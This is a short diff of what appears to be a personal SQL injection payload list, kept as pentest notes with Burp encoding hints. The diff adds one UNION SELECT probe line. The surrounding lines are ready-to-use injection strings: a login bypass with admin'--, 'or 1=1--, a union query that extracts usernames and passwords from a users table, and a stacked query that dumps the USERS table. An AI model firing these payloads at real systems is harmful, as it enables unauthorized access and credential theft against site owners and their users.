@@ -2,7 +2,7 @@ admin'--     //Username input
 '+or+1=1--              Burp     [For + space or %20]
 '+select+null,null,null --
 'union+select+username,password+from+users--
-
+'union+select+null,'Wq9f2g',1234--
 
 " or ""="
 SELECT name, type FROM USERS WHERE name LIKE "%1"; SELECT * FROM USERS WHERE "%"="%";
